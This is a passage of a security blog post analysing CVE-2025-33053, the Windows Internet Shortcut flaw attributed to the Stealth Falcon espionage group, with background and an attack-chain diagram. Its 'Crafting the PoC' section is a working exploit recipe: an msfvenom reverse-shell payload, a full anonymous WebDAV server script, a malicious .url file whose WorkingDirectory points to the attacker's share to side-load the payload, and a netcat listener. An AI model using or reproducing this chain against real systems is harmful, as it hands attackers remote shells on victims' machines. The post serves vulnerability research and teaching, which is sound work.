<!doctype html><html lang=en-us data-theme><head><meta charset=utf-8><meta name=HandheldFriendly content="True"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer-when-downgrade"><title>CVE-2025-33053 Analysis - t1nt1n</title>
<meta name=description content="

    
        #
    
    Introduction


Hello fellow researcher! In this blogpost, we are going to do a deep analysis of CVE-2025-33053. How this simple yet sneaky tactic was/is being used by APT Group Stealth Falcon. Stealth Falcon, also known as Project Raven, G0038, and FruityArmor, is a cyberespionage group linked to the United Arab Emirates (UAE). They have been active since at least 2012, targeting political activists, journalists, and dissidents primarily in the Middle East, including the UAE, as well as individuals and entities in countries like the Netherlands, Saudi Arabia, Thailand, and the United Kingdom."><link rel=icon type=image/x-icon href=https://arkaprabhachakraborty.github.io/favicon.ico><link rel=apple-touch-icon-precomposed href=https://arkaprabhachakraborty.github.io/favicon.png><style>body{visibility:hidden;opacity:0}</style><noscript><style>body{visibility:visible;opacity:1}</style></noscript><link rel=stylesheet href=/css/style.min.184a655c5ad8596648622468e6696abf0cf0a2cf8266df17b4f7a36fe9c97551.css integrity="sha256-GEplXFrYWWZIYiRo5mlqvwzwos+CZt8XtPejb+nJdVE="><link rel=stylesheet href=/css/style.min.c4c04b3ef88e3d619ad4c7ee5e03048422bc55c4fefdc1f07657c1133670aa22.css integrity="sha256-xMBLPviOPWGa1MfuXgMEhCK8VcT+/cHwdlfBEzZwqiI="><link rel=stylesheet href=/css/style.min.21c5d8fe0a79d623b0adc1ce4bd4f6dd2c05cd939c9aaaa966ba7186b1464f4d.css integrity="sha256-IcXY/gp51iOwrcHOS9T23SwFzZOcmqqpZrpxhrFGT00="><script src=/js/script.min.08f04d96386c73c9bf4d160333f8f448c05a6e01c06770542ee0e013954ce930.js type=text/javascript integrity="sha256-CPBNljhsc8m/TRYDM/j0SMBabgHAZ3BULuDgE5VM6TA="></script></head><body><a class=skip-main href=#main>Skip to main content</a><div class=container><header class=common-header><div class=header-top><div class=header-top-left><h1 class="site-title noselect"><a href=/>t1nt1n</a></h1><div class=theme-switcher><span class=inline-svg><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-sun-high"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M14.828 14.828A4 4 0 109.172 9.172a4 4 0 005.656 5.656z"/><path d="M6.343 17.657l-1.414 1.414"/><path d="M6.343 6.343 4.929 4.929"/><path d="M17.657 6.343l1.414-1.414"/><path d="M17.657 17.657l1.414 1.414"/><path d="M4 12H2"/><path d="M12 4V2"/><path d="M20 12h2"/><path d="M12 20v2"/></svg></span></div><script>const STORAGE_KEY="user-color-scheme",defaultTheme="auto";let currentTheme,switchButton,autoDefinedScheme=window.matchMedia("(prefers-color-scheme: dark)");function switchTheme(){currentTheme=currentTheme==="dark"?"light":"dark",localStorage&&localStorage.setItem(STORAGE_KEY,currentTheme),document.documentElement.setAttribute("data-theme",currentTheme),changeGiscusTheme(currentTheme),document.body.dispatchEvent(new CustomEvent(currentTheme+"-theme-set"))}const autoChangeScheme=e=>{currentTheme=e.matches?"dark":"light",document.documentElement.setAttribute("data-theme",currentTheme),changeGiscusTheme(currentTheme),document.body.dispatchEvent(new CustomEvent(currentTheme+"-theme-set"))};document.addEventListener("DOMContentLoaded",function(){switchButton=document.querySelector(".theme-switcher"),currentTheme=detectCurrentScheme(),currentTheme==="auto"?(autoChangeScheme(autoDefinedScheme),autoDefinedScheme.addListener(autoChangeScheme)):document.documentElement.setAttribute("data-theme",currentTheme),switchButton&&switchButton.addEventListener("click",switchTheme,!1),showContent()});function detectCurrentScheme(){return localStorage!==null&&localStorage.getItem(STORAGE_KEY)?localStorage.getItem(STORAGE_KEY):defaultTheme?defaultTheme:window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"}function showContent(){document.body.style.visibility="visible",document.body.style.opacity=1}function changeGiscusTheme(e){function t(e){const t=document.querySelector("iframe.giscus-frame");if(!t)return;t.contentWindow.postMessage({giscus:e},"https://giscus.app")}t({setConfig:{theme:e}})}</script><ul class="social-icons noselect"><li><a href=https://github.com/ArkaprabhaChakraborty title=Github rel=me><span class=inline-svg><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-github"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></span></a></li><li><a href=https://www.linkedin.com/arkaprabhachakraborty title=Linkedin rel=me><span class=inline-svg><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-linkedin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4m0 2a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2z"/><path d="M8 11v5"/><path d="M8 8v.01"/><path d="M12 16v-5"/><path d="M16 16v-3a2 2 0 00-4 0"/></svg></span></a></li><li><a href=https://www.twitter.com/FValkyrie_17 title=X rel=me><span class=inline-svg><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-x"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4l11.733 16H20L8.267 4z"/><path d="M4 20l6.768-6.768m2.46-2.46L20 4"/></svg></span></a></li><li><a href=https://www.gitlab.com/ArkaprabhaChakraborty title=Gitlab rel=me><span class=inline-svg><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-gitlab"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M21 14l-9 7-9-7L6 3l3 7h6l3-7z"/></svg></span></a></li><li><a href=/index.xml title=RSS rel=me><span class=inline-svg><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-rss"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></span></a></li></ul></div><div class=header-top-right></div></div><nav class=noselect><a href=https://arkaprabhachakraborty.github.io/ title>Home</a>
<a href=https://arkaprabhachakraborty.github.io/about/ title>About</a>
<a href=https://arkaprabhachakraborty.github.io/tags/ title>Tags</a></nav></header><main id=main tabindex=-1><article class="post h-entry"><div class=post-header><header><h1 class="p-name post-title">CVE-2025-33053 Analysis</h1></header><div class="post-info noselect"><div class="post-date dt-published"><time datetime=2024-10-06>2024-10-06</time></div><a class="post-hidden-url u-url" href=/blog/CVE-2025-33053-Analysis/>/blog/CVE-2025-33053-Analysis/</a>
<a href=https://arkaprabhachakraborty.github.io/ class="p-name p-author post-hidden-author h-card" rel=me>map[email:arkaprabhachakraborty2001@gmail.com location:India name:Arkaprabha Chakraborty]</a><div class=post-taxonomies></div></div></div><details class="toc noselect"><summary>Table of Contents</summary><div class=inner><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#cve-details>CVE Details</a></li><li><a href=#stealth-falcon-attack-strategy>Stealth Falcon Attack Strategy</a></li><li><a href=#crafting-the-poc>Crafting the PoC</a></li><li><a href=#why-it-works>Why it works?</a><ul><li><a href=#the-execution-flow-of-a-url-file>The Execution Flow of a .url File</a></li><li><a href=#the-role-of-shellexecuteex-and-createprocessw>The Role of ShellExecuteEx and CreateProcessW</a></li><li><a href=#the-significance-of-the-workingdirectory-parameter>The Significance of the WorkingDirectory Parameter</a></li><li><a href=#windows-dll-search-order-and-side-loading>Windows DLL Search Order and Side-Loading</a></li><li><a href=#webdav-and-remote-execution>WebDAV and Remote Execution</a></li></ul></li><li><a href=#references>References:</a></li></ul></nav></div></details><script>var toc=document.querySelector(".toc");toc&&toc.addEventListener("click",function(){event.target.tagName!=="A"&&(event.preventDefault(),this.open?(this.open=!1,this.classList.remove("expanded")):(this.open=!0,this.classList.add("expanded")))})</script><div class="content e-content"><h2 id=introduction><div><a href=#introduction>#
</a>Introduction</div></h2><p>Hello fellow researcher! In this blogpost, we are going to do a deep analysis of <a href=https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33053>CVE-2025-33053</a>. How this simple yet sneaky tactic was/is being used by APT Group Stealth Falcon. <a href=https://malpedia.caad.fkie.fraunhofer.de/actor/stealth_falcon>Stealth Falcon</a>, also known as Project Raven, G0038, and FruityArmor, is a cyberespionage group linked to the United Arab Emirates (UAE). They have been active since at least 2012, targeting political activists, journalists, and dissidents primarily in the Middle East, including the UAE, as well as individuals and entities in countries like the Netherlands, Saudi Arabia, Thailand, and the United Kingdom.</p><p>While there&rsquo;s no definitive proof, <a href=https://attack.mitre.org/groups/G0038/>MITRE ATT&amp;CK</a> says that circumstantial evidence suggests a potential connection between Stealth Falcon and the UAE government. Researchers like Citizen Lab have published reports detailing the group&rsquo;s tactics, techniques, and procedures (TTPs), which include spear-phishing attacks, PowerShell macros, URL shorteners, and social engineering. Some reports also link Stealth Falcon to Project Raven, an initiative allegedly involving former NSA operatives.</p><h2 id=cve-details><div><a href=#cve-details>#
</a>CVE Details</div></h2><p><strong>NVD:</strong> External control of file name or path in Internet Shortcut Files allows an unauthorized attacker to execute code over a network.</p><p><strong>MSRC:</strong> While Microsoft has announced retirement of the Internet Explorer 11 application on certain platforms and the Microsoft Edge Legacy application is deprecated, the underlying MSHTML, EdgeHTML, and scripting platforms are still supported. The MSHTML platform is used by Internet Explorer mode in Microsoft Edge as well as other applications through WebBrowser control. The EdgeHTML platform is used by WebView and some UWP applications. The scripting platforms are used by MSHTML and EdgeHTML but can also be used by other legacy applications. Updates to address vulnerabilities in the MSHTML platform and scripting engine are included in the IE Cumulative Updates; EdgeHTML and Chakra changes are not applicable to those platforms.</p><h2 id=stealth-falcon-attack-strategy><div><a href=#stealth-falcon-attack-strategy>#
</a>Stealth Falcon Attack Strategy</div></h2><p>According Checkpoint&rsquo;s research, the following are the steps involved in Stealth Falcon&rsquo;s attack strategy.</p><ul><li><p><strong>Initial Compromise</strong></p><p>&ndash; Stealth Falcon initiates attacks through sophisticated phishing email campaigns that contain ZIP archive attachments designed to bypass email security filters</p><p>&ndash; The threat actors pack malicious <code>.url</code> files as legitimate PDF documents within the ZIP file to bypass Mark of the Web and smart screen related checks</p><p>&ndash; The attack chain is designed to require minimal user interaction, typically just a double-click on what appears to be a standard PDF file</p></li><li><p><strong>CVE-2025-33053 Exploitation</strong>
&ndash; The core vulnerability exploitation involves manipulating the WorkingDirectory parameter in malicious <code>.url</code> files to point to attacker-controlled WebDAV servers</p><p>&ndash; Stealth Falcon leverages Windows&rsquo; Dynamic Link Library search order mechanism to hijack the loading process and force the system to load malicious executables before legitimate ones</p><p>&ndash; The attack successfully bypasses Windows System32 directory protections by ensuring the malicious <code>route.exe</code> is discovered and loaded before the legitimate system executable</p><p>&ndash; This technique achieves fileless execution by loading malicious code directly from remote WebDAV shares without dropping any persistent files on the victim&rsquo;s local filesystem</p></li><li><p><strong>Streamlined Multi-Layer Attack Implementation</strong></p><p>&ndash; <strong>Two-Stage Payload Deployment:</strong> Employs Horus Loader for initial access with anti-analysis capabilities, followed by Horus Agent (Mythic-based implant) that injects into legitimate processes like msedge.exe while displaying decoy PDFs to maintain stealth.</p><p>&ndash; <strong>Advanced Evasion Framework:</strong> Implements Code Virtualizer protection, manual DLL mapping, and scans for 100+ security processes. Uses custom OLLVM obfuscation, string encryption, control flow flattening, and API hashing to prevent reverse engineering.</p><p>&ndash; <strong>IPfuscation Steganography:</strong> Conceals payload components within IPv6 address structures to evade network-based detection systems, demonstrating sophisticated understanding of security monitoring blind spots.</p><p>&ndash; <strong>Resilient C2 Infrastructure:</strong> Secures communications with AES-256 encryption and HMAC-SHA256 integrity verification across multiple domains (up to 4 servers) for operational redundancy and takedown resistance.</p><p>&ndash; <strong>Comprehensive Espionage Platform:</strong> Conducts detailed system fingerprinting and environment analysis while maintaining long-term persistence through remote command execution, file operations, and shellcode injection for intelligence gathering.</p><p>&ndash; <strong>Living-Off-The-Land Integration:</strong> Leverages legitimate Windows functionality and processes to maintain operational security, making detection significantly more challenging for traditional security tools and analysts.</p></li></ul><pre class=mermaid>flowchart LR
    subgraph Col1 ["Initial Attack Vector"]
        direction TB
        A["üìß Phishing Email<br>üîó ZIP Attachment<br>üìé Social Engineering"] 
        B["üì¶ Victim Opens Archive<br>üóÇÔ∏è Extracts Contents<br>üëÅÔ∏è Sees 'PDF' File"]
        C["üé≠ Malicious LM.005 TELESCOPIC MAST DAMAGE REPORT.pdf.url File<br>üìÑ Disguised as PDF<br>‚ö†Ô∏è Contains WebDAV Path"]
        D["üëÜ User Double-Clicks<br>üöÄ Triggers Execution<br>‚è∞ Attack Initiated"]
        
        A --> B --> C --> D
        
        style A fill:#2d3436,stroke:#636e72,color:#ddd
        style B fill:#34495e,stroke:#7f8c8d,color:#ecf0f1
        style C fill:#e17055,stroke:#d63031,color:#fff
        style D fill:#f39c12,stroke:#e67e22,color:#2d3436
    end
    
    subgraph Col2 ["Windows Shell Processing"]
        direction TB
        E["Windows Shell Invoked<br> Parses LM.005 TELESCOPIC MAST DAMAGE REPORT.pdf.url File<br>Reads Parameters"]
        F["ShellExecuteEx API<br> SHELLEXECUTEINFO Struct<br> lpDirectory Parameter"]
        G["WorkingDirectory Set to Remote WebDav Share<br>"]
        H["iediagcmd.exe Launched<br> Process Created with </br> Remote Working Directory <br>"]
        
        E --> F --> G --> H
        
        style E fill:#2c3e50,stroke:#34495e,color:#ecf0f1
        style F fill:#16a085,stroke:#1abc9c,color:#2d3436
        style G fill:#00b894,stroke:#00cec9,color:#2d3436
        style H fill:#0984e3,stroke:#74b9ff,color:#fff
    end
    
    subgraph Col3 ["Exploitation"]
        direction TB
        I["‚ö†Ô∏è DLL Search Order Attack<br>üîç Windows LoadLibrary<br>üìã Search Algorithm Abused"]
        J["‚ùå Step 1: Current Directory<br>üîé Searches WebDAV Path<br>üö´ NO route.exe Found"]
        K["‚úÖ Step 2: Remote Loading<br>üì• Malicious route.exe Found<br>üé≠ Loaded from WebDAV"]
        L["üõ°Ô∏è System32 Bypassed<br>üíÄ Malicious Code Executed<br>üèÜ Exploit Successful"]
        
        I --> J --> K --> L
        
        style I fill:#c0392b,stroke:#e74c3c,color:#fff
        style J fill:#d35400,stroke:#e67e22,color:#fff
        style K fill:#e17055,stroke:#fd79a8,color:#2d3436
        style L fill:#8e44ad,stroke:#9b59b6,color:#fff
    end
    
    subgraph Col4 ["üîß Stage 1: Horus Loader"]
        direction TB
        M["üêç Horus Loader Activated<br>üõ°Ô∏è Anti-Analysis Suite<br>üîí Code Virtualizer"]
        N["üõ°Ô∏è Evasion Techniques<br>üîç Scans 100+ AV Processes<br>üß© Manual DLL Mapping"]
        O["üìÑ Decoy PDF Displayed<br>üëÅÔ∏è User Distraction<br>üé≠ Maintains Legitimacy"]
        P["üî¢ IPfuscation Technique<br>üåê IPv6 Address Decoding<br>üì¶ Payload Extraction"]
        
        M --> N --> O --> P
        
        style M fill:#27ae60,stroke:#2ecc71,color:#2d3436
        style N fill:#f39c12,stroke:#f1c40f,color:#2d3436
        style O fill:#95a5a6,stroke:#bdc3c7,color:#2d3436
        style P fill:#e67e22,stroke:#d35400,color:#fff
    end
    
    subgraph Col5 ["üíâ Stage 2: Payload Inject"]
        direction TB
        Q["üéØ Target: msedge.exe<br>üíâ Process Injection<br>üîß Advanced Techniques"]
        R["‚ö° System Call Arsenal<br>üìã ZwAllocateVirtualMemory<br>‚úçÔ∏è ZwWriteVirtualMemory<br>‚ñ∂Ô∏è NtResumeThread"]
        S["ü§ñ Horus Agent Deployed<br>üîó Mythic-Based Implant<br>üé≠ Heavy Obfuscation"]
        T["üõ°Ô∏è Protection Layers<br>üîÄ OLLVM Techniques<br>üîê String Encryption<br>üåÄ Control Flow Flattening"]
        
        Q --> R --> S --> T
        
        style Q fill:#6c5ce7,stroke:#a29bfe,color:#fff
        style R fill:#fd79a8,stroke:#fdcb6e,color:#2d3436
        style S fill:#2d3436,stroke:#636e72,color:#ddd
        style T fill:#00cec9,stroke:#55efc4,color:#2d3436
    end
    
    subgraph Col6 ["üåê Persistent Operations"]
        direction TB
        U["üìã Agent Registration<br>üñ•Ô∏è System Fingerprinting<br>üîç Environment Analysis"]
        V["üì° C2 Communication<br>üîó Multiple Domains<br>‚ö° Encrypted Channels"]
        W["üîê AES-256 Encryption<br>‚úÖ HMAC-SHA256 Integrity<br>üåê Up to 4 C2 Domains"]
        X["üïµÔ∏è Espionage Operations<br>‚ö° Command Execution<br>üìÅ File Operations<br>üíâ Shellcode Injection<br>üîç System Reconnaissance"]
        
        U --> V --> W --> X
        
        style U fill:#2c3e50,stroke:#34495e,color:#ecf0f1
        style V fill:#16a085,stroke:#1abc9c,color:#2d3436
        style W fill:#3742fa,stroke:#5f27cd,color:#fff
        style X fill:#8e44ad,stroke:#9b59b6,color:#fff
    end
    
    %% Inter-column connections with improved visibility
    Col1 -.->|"üîó Triggers"| Col2
    Col2 -.->|"‚ö° Exploits"| Col3  
    Col3 -.->|"üöÄ Executes"| Col4
    Col4 -.->|"üíâ Injects"| Col5
    Col5 -.->|"üì° Establishes"| Col6
    
    %% Dark mode-friendly subgraph styling with even spacing
    style Col1 fill:#2d343640,stroke:#e17055,stroke-width:3px
    style Col2 fill:#2d343640,stroke:#0984e3,stroke-width:3px
    style Col3 fill:#2d343640,stroke:#c0392b,stroke-width:3px
    style Col4 fill:#2d343640,stroke:#27ae60,stroke-width:3px
    style Col5 fill:#2d343640,stroke:#6c5ce7,stroke-width:3px
    style Col6 fill:#2d343640,stroke:#2c3e50,stroke-width:3px
</pre><h2 id=crafting-the-poc><div><a href=#crafting-the-poc>#
</a>Crafting the PoC</div></h2><p>This vulnerability can be exploited by using <strong>ANY</strong> <a href=https://lolbas-project.github.io>LOLBINS</a>. The only thing required is that the binary specified within <code>URL</code> parameter of the <code>.url</code> file must call the malicious executable file or <code>.dll</code> in the attacker hosted WebDAV server [More details given below].</p><p>For this example we are using <a href=https://lolbas-project.github.io/lolbas/Binaries/Iediagcmd><code>iediagcmd.exe</code></a>.</p><ol><li><p>Create an reverse shell payload with the name <code>route.exe</code>. Msfvenom can be useful! Modify <code>LHOST</code> and <code>LPORT</code> parameters to suit your need.</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msfvenom -p windows/shell_reverse_tcp <span style=color:#ff5c57>LHOST</span><span style=color:#ff6ac1>=</span>192.168.10.10  <span style=color:#ff5c57>LPORT</span><span style=color:#ff6ac1>=</span><span style=color:#ff9f43>9999</span> -f exe -o route.exe
</span></span></code></pre></div></li><li><p>Create a webdav server using WSGI-DAV in python by using the following code:</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#78787e># required to be run in sudo mode if port 80 is what you wanna use</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff6ac1>import</span> os
</span></span><span style=display:flex><span><span style=color:#ff6ac1>import</span> argparse
</span></span><span style=display:flex><span><span style=color:#ff6ac1>from</span> wsgidav.wsgidav_app <span style=color:#ff6ac1>import</span> WsgiDAVApp
</span></span><span style=display:flex><span><span style=color:#ff6ac1>from</span> wsgidav.fs_dav_provider <span style=color:#ff6ac1>import</span> FilesystemProvider
</span></span><span style=display:flex><span><span style=color:#ff6ac1>from</span> cheroot <span style=color:#ff6ac1>import</span> wsgi
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#78787e># Configuration</span>
</span></span><span style=display:flex><span>HOST <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;0.0.0.0&#34;</span>  <span style=color:#78787e># Listen on all interfaces</span>
</span></span><span style=display:flex><span>PORT <span style=color:#ff6ac1>=</span> <span style=color:#ff9f43>80</span>  <span style=color:#78787e># WebDAV port</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff6ac1>def</span> <span style=color:#57c7ff>setup_webdav_config</span>(share_path):
</span></span><span style=display:flex><span>    <span style=color:#5af78e>&#34;&#34;&#34;Configure WSGIDav with the specified share directory.&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff6ac1>return</span> {
</span></span><span style=display:flex><span>        <span style=color:#5af78e>&#34;host&#34;</span>: HOST,
</span></span><span style=display:flex><span>        <span style=color:#5af78e>&#34;port&#34;</span>: PORT,
</span></span><span style=display:flex><span>        <span style=color:#5af78e>&#34;provider_mapping&#34;</span>: {
</span></span><span style=display:flex><span>            <span style=color:#5af78e>&#34;/&#34;</span>: FilesystemProvider(share_path)  <span style=color:#78787e># Map root to share directory</span>
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        <span style=color:#5af78e>&#34;simple_dc&#34;</span>: {
</span></span><span style=display:flex><span>            <span style=color:#5af78e>&#34;user_mapping&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#5af78e>&#34;/&#34;</span>: <span style=color:#ff6ac1>True</span>  <span style=color:#78787e># Allow anonymous access to root</span>
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        <span style=color:#5af78e>&#34;verbose&#34;</span>: <span style=color:#ff6ac1>True</span>,  <span style=color:#78787e># Simplified verbosity</span>
</span></span><span style=display:flex><span>        <span style=color:#5af78e>&#34;property_manager&#34;</span>: <span style=color:#ff6ac1>True</span>,  <span style=color:#78787e># Enable property storage</span>
</span></span><span style=display:flex><span>        <span style=color:#5af78e>&#34;lock_storage&#34;</span>: <span style=color:#ff6ac1>True</span>,  <span style=color:#78787e># WebDAV locking</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff6ac1>if</span> __name__ <span style=color:#ff6ac1>==</span> <span style=color:#5af78e>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    <span style=color:#78787e># Parse command-line arguments</span>
</span></span><span style=display:flex><span>    parser <span style=color:#ff6ac1>=</span> argparse<span style=color:#ff6ac1>.</span>ArgumentParser(description<span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;Host a WebDAV share without authentication&#34;</span>)
</span></span><span style=display:flex><span>    parser<span style=color:#ff6ac1>.</span>add_argument(
</span></span><span style=display:flex><span>        <span style=color:#5af78e>&#34;--dir&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#ff5c57>type</span><span style=color:#ff6ac1>=</span><span style=color:#ff5c57>str</span>,
</span></span><span style=display:flex><span>        default<span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;./webdav&#34;</span>,
</span></span><span style=display:flex><span>        help<span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;Directory to share via WebDAV (default: ./webdav)&#34;</span>
</span></span><span style=display:flex><span>    )
</span></span><span style=display:flex><span>    args <span style=color:#ff6ac1>=</span> parser<span style=color:#ff6ac1>.</span>parse_args()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#78787e># Validate and create share directory</span>
</span></span><span style=display:flex><span>    SHARE_PATH <span style=color:#ff6ac1>=</span> os<span style=color:#ff6ac1>.</span>path<span style=color:#ff6ac1>.</span>abspath(args<span style=color:#ff6ac1>.</span>dir)
</span></span><span style=display:flex><span>    <span style=color:#ff5c57>print</span>(<span style=color:#5af78e>f</span><span style=color:#5af78e>&#34;Parsed directory: </span><span style=color:#5af78e>{</span>SHARE_PATH<span style=color:#5af78e>}</span><span style=color:#5af78e>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#ff6ac1>if</span> <span style=color:#ff6ac1>not</span> os<span style=color:#ff6ac1>.</span>path<span style=color:#ff6ac1>.</span>exists(SHARE_PATH):
</span></span><span style=display:flex><span>        <span style=color:#ff6ac1>try</span>:
</span></span><span style=display:flex><span>            os<span style=color:#ff6ac1>.</span>makedirs(SHARE_PATH)
</span></span><span style=display:flex><span>            os<span style=color:#ff6ac1>.</span>chmod(SHARE_PATH, <span style=color:#ff9f43>0o755</span>)  <span style=color:#78787e># Ensure readable/writable</span>
</span></span><span style=display:flex><span>            <span style=color:#ff5c57>print</span>(<span style=color:#5af78e>f</span><span style=color:#5af78e>&#34;Created share directory: </span><span style=color:#5af78e>{</span>SHARE_PATH<span style=color:#5af78e>}</span><span style=color:#5af78e>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#ff6ac1>except</span> OSError <span style=color:#ff6ac1>as</span> e:
</span></span><span style=display:flex><span>            <span style=color:#ff5c57>print</span>(<span style=color:#5af78e>f</span><span style=color:#5af78e>&#34;Failed to create directory </span><span style=color:#5af78e>{</span>SHARE_PATH<span style=color:#5af78e>}</span><span style=color:#5af78e>: </span><span style=color:#5af78e>{</span>e<span style=color:#5af78e>}</span><span style=color:#5af78e>&#34;</span>)
</span></span><span style=display:flex><span>            exit(<span style=color:#ff9f43>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#78787e># Configure and start WebDAV server</span>
</span></span><span style=display:flex><span>    config <span style=color:#ff6ac1>=</span> setup_webdav_config(SHARE_PATH)
</span></span><span style=display:flex><span>    app <span style=color:#ff6ac1>=</span> WsgiDAVApp(config)
</span></span><span style=display:flex><span>    server <span style=color:#ff6ac1>=</span> wsgi<span style=color:#ff6ac1>.</span>Server((HOST, PORT), app)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff5c57>print</span>(<span style=color:#5af78e>f</span><span style=color:#5af78e>&#34;Starting WebDAV server on http://</span><span style=color:#5af78e>{</span>HOST<span style=color:#5af78e>}</span><span style=color:#5af78e>:</span><span style=color:#5af78e>{</span>PORT<span style=color:#5af78e>}</span><span style=color:#5af78e>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#ff5c57>print</span>(<span style=color:#5af78e>f</span><span style=color:#5af78e>&#34;Shared directory: </span><span style=color:#5af78e>{</span>SHARE_PATH<span style=color:#5af78e>}</span><span style=color:#5af78e>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#ff5c57>print</span>(<span style=color:#5af78e>&#34;No authentication required&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#ff5c57>print</span>(<span style=color:#5af78e>&#34;Press Ctrl+C to stop&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#ff6ac1>try</span>:
</span></span><span style=display:flex><span>        server<span style=color:#ff6ac1>.</span>start()
</span></span><span style=display:flex><span>    <span style=color:#ff6ac1>except</span> KeyboardInterrupt:
</span></span><span style=display:flex><span>        <span style=color:#ff5c57>print</span>(<span style=color:#5af78e>&#34;</span><span style=color:#5af78e>\n</span><span style=color:#5af78e>Stopping WebDAV server...&#34;</span>)
</span></span><span style=display:flex><span>        server<span style=color:#ff6ac1>.</span>stop()
</span></span></code></pre></div><p>Run the <code>webdav.py</code> script. By default it points to a <code>./webdav</code> directory and creates a <code>./webdav</code> directory if it doesn&rsquo;t find any.</p><pre tabindex=0><code>sudo python3 webdav.py
</code></pre><p>You can move your payload to the webdav directory without shutting down the server. Or if you wanna change the directory to where your reverse shell payload is then you can use the <code>--dir</code> flag. Choice is yours! Always has been.</p></li><li><p>The vulnerability is in the capability of windows to execute PE files using webclient. Create a <code>.url</code> based file (eg: evil.pdf.url) like the one given below:</p><pre tabindex=0><code>[InternetShortcut]
URL=C:\Program Files\Internet Explorer\iediagcmd.exe
WorkingDirectory=\\192.168.10.10\webdav
ShowCommand=7
IconIndex=13
IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
Modified=20F06BA06D07BD014D
</code></pre><p>This file uses <code>iediagcmd.exe</code> as it&rsquo;s LOLBIN, which in turn calls <code>route.exe</code> located in the Attacker controlled WebDAV server.
I have my default share of WebDAV server named as <code>/webdav</code>, hence the UNC path is <code>\\&lt;ATTACKER_IP aka 192.168.10.10>\webdav</code>. If your share path is anywhere else you&rsquo;ll have to modify the <code>WorkingDirectory</code> parameter or the file.</p></li><li><p>Open a netcat listener on attacker machine.</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -vnlp <span style=color:#ff9f43>9999</span>
</span></span></code></pre></div><p>In this case the victim has to interact with the file to get a reverse shell.</p></li></ol><h2 id=why-it-works><div><a href=#why-it-works>#
